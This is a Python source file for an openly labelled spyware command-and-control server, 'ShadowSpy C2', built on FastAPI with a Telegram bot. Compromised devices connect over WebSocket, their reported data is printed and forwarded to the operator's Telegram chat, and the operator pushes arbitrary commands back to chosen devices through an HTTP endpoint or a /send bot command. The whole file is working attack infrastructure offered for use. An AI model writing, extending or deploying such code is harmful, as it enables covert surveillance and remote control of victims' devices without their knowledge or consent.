import asyncio
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import threading

app = FastAPI(title="ShadowSpy C2 Local Server")

connected_clients = {}
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"  # Replace with your bot token
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"  # Your personal chat ID for commands

bot = Bot(token=TELEGRAM_TOKEN)

@app.get("/")
async def home():
    return HTMLResponse("""<h1>ShadowSpy C2 - WebSocket + Telegram Active</h1><p>Connect clients on /ws | Telegram bot ready</p>""")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    device_id = await websocket.receive_text()
    connected_clients[device_id] = websocket
    print(f"[+] Device connected: {device_id}")
    try:
        while True:
            data = await websocket.receive_text()
            print(f"[Device {device_id}] {data}")
            # Forward to Telegram if needed
            await bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"[Device {device_id}] {data}")
    except WebSocketDisconnect:
        print(f"[-] Device disconnected: {device_id}")
        del connected_clients[device_id]

@app.post("/send_command")
async def send_command(cmd: dict):
    device_id = cmd.get("device_id")
    command = cmd.get("command")
    if device_id in connected_clients:
        ws = connected_clients[device_id]
        await ws.send_text(json.dumps({"command": command}))
        return {"status": "sent"}
    return {"status": "device not connected"}

# Telegram bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('ShadowSpy C2 Telegram Bot Online. Use /send <device_id> <command>')

async def send_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text('Usage: /send <device_id> <command>')
            return
        device_id = args[0]
        command = ' '.join(args[1:])
        if device_id in connected_clients:
            ws = connected_clients[device_id]
            await ws.send_text(json.dumps({"command": command}))
            await update.message.reply_text(f'Command sent to {device_id}: {command}')
        else:
            await update.message.reply_text(f'Device {device_id} not connected')
    except Exception as e:
        await update.message.reply_text(f'Error: {str(e)}')

def run_telegram_bot():
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("send", send_cmd))
    application.run_polling()

if __name__ == "__main__":
    # Start Telegram bot in background thread
    telegram_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    telegram_thread.start()
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
